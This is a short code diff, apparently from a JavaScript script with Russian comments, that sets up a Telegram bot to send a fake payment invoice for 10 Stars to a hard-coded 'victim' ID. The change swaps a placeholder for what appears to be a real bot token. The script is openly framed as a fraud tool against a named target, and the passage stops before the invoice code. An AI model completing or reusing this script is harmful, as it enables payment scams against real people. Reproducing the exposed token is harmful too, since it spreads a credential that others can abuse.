@@ -1,5 +1,5 @@
 // Используем Telegram Bot API для создания фейкового платежа
-const botToken = 'ТВОЙ_ТОКЕН_БОТА'; // Токен от @BotFather
+const botToken = '8529402155:AAHrSt4snbm8mUTzncrglueNocIwj81at0A'; // Токен от @BotFather
 const victimId = 1398396668; // ID жертвы
 
 // Создаем инвойс на 10 Stars
